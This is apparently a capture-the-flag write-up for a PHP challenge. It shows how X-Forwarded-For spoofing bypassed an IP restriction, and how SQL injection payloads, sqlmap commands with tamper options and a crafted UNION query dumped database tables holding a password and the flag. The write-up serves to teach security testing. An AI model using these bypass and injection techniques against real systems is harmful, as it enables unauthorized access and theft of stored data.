# Clubmouse

We are presented with a PHP webpage. There is a `login.php`, but it gives us a 403 Forbidden error. Looking a little deeper into `gallery.php` shows us that some of the pictures of the devices include internal subnet addresses.

![](<../../.gitbook/assets/image (14).png>)

![](<../../.gitbook/assets/image (15).png>)

One way that the login page might be filtering requests is by the user's IP address. The `X-Forwarded-For` header is used for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. 

However, it can also be easily changed by the client. By running a Burp Suite Intruder scan for the request header`X-Forwarded-For: 192.168.3.x`, where `x` is the payload, we see that by setting the `X-Forwarded-For` header to `192.168.3.16`, we gain access to the login page.

![](<../../.gitbook/assets/image (16).png>)

We see a form with `username` and `password` fields. Using `'` in username parameter leads to the following output:

```markup
<h4 style='color: red;' class='text-center'>There is a sql error, Call the administrator!</h4>
```

We have identified an SQL injection vulnerability. By using the following payload, we can bypass the authentication.

```
username=test&password=test' or 1=1 LIMIT 1;#
```

Once logged in as the admin, we have access to a `users.php` page. This page contains usernames and card numbers.

```markup
<tbody>
   <tr>
      <th scope="row">1</th>
      <td>melo</td>
      <td>1457888555215515</td>
   </tr>
   <tr>
      <th scope="row">2</th>
      <td>john</td>
      <td>99888515654864655</td>
   </tr>
   <tr>
      <th scope="row">3</th>
      <td>admin</td>
      <td>85551496165161665</td>
   </tr>
</tbody>
```

This page must also be fetching the user information through the database, so we tested for additional SQL injection endpoints. 

We found that `/users.php?id=1` returns only the data for user ID 1. Fuzzing the input leads us to discover that this is a second SQL injection endpoint. This time, there is a blacklist filter:

```markup
<script>alert('Bad character/word ditected!');</script>
```

Using SQLMap, we get the following injection vectors:

```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 5928=5928 AND ('bLIm'='bLIm

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 2847 FROM (SELECT(SLEEP(5)))MMVq) AND ('pklt'='pklt

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=1') UNION ALL SELECT NULL,CONCAT(0x7170786a71,0x4a6d4669536b6565767a724d666e776b46517a7853774374787154644d49664b664b565242485172,0x7171787171),NULL,NULL-- -
---
```

`sqlmap -r get.req --threads 10 --dbms mysql --dump --no-escape --tamper=between` dumps the database.

```
Database: users_data
Table: data
[3 entries]
+----+-------+-------------------+-----------+
| id | user  | card_num          | R34L_F14G |
+----+-------+-------------------+-----------+
| 1  | melo  | 1457888555215515  | <blank>   |
| 2  | john  | 99888515654864655 | <blank>   |
| 3  | admin | 85551496165161665 | <blank>   |
+----+-------+-------------------+-----------+
```

```
Database: login_users
Table: users
[1 entry]
+----+-----------------------------+----------+---------------------+
| id | password                    | username | created_at          |
+----+-----------------------------+----------+---------------------+
| 1  | R34ly_h4rd_p@ssw0rd_t0_f1nd | admin    | 2021-07-13 03:15:21 |
+----+-----------------------------+----------+---------------------+
```

We see that there is a `R34L_F14G` column, but it is returning us `<blank>` results. I looked deeper into the SQLMap queries, and found that the following query is used to retrieve the column values.

`GET /users.php?id=1%27)%20UNION%20ALL%20SELECT%20NULL,CONCAT(%27qzppq%27,JSON_ARRAYAGG(CONCAT_WS(%27kbxmel%27,card_num)),%27qpbzq%27),NULL,NULL%20FROM%20users_data.data%20ORDER%20BY%20card_num--%20-`

Replacing `card_num` with `R34L_F14G` fails the blacklist filter, so SQLMap was unable to retrieve any results.

Remember `login.php` from earlier? It did not filter `R34L_F14G`, but it does have an SQL injection vector too. It was a blind SQL injection, so retrieving information from the database would be time-based and it would have been too slow to dump the entire database. 

However, by specifying the specific table and column to dump, we got our results much faster.

`sqlmap -u http://challenges.ctfd.io:30232/login.php --headers=“X-Forwarded-For: 192.168.3.16” --data “password=1&username=test” --dbms=mysql --tamper=between -D users_data -T data -C R34L_F14G --dump --where “id=3”`

This gave us the flag, `S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}`.
